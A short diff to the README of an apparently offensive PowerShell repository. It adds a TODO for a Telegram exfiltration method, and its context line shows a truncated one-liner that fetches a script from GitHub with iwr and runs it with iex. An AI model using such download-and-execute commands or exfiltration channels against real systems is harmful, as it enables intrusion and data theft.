@@ -98,3 +98,6 @@ iex((iwr -uri https://github.com/Soumyo001/offensive_powershell/raw/refs/heads/m
 ## Contributing
 
 Contributions and improvements are welcome. Please fork the repository and submit pull requests.
+
+## TODO
+- **Add telegram exfiltration method**
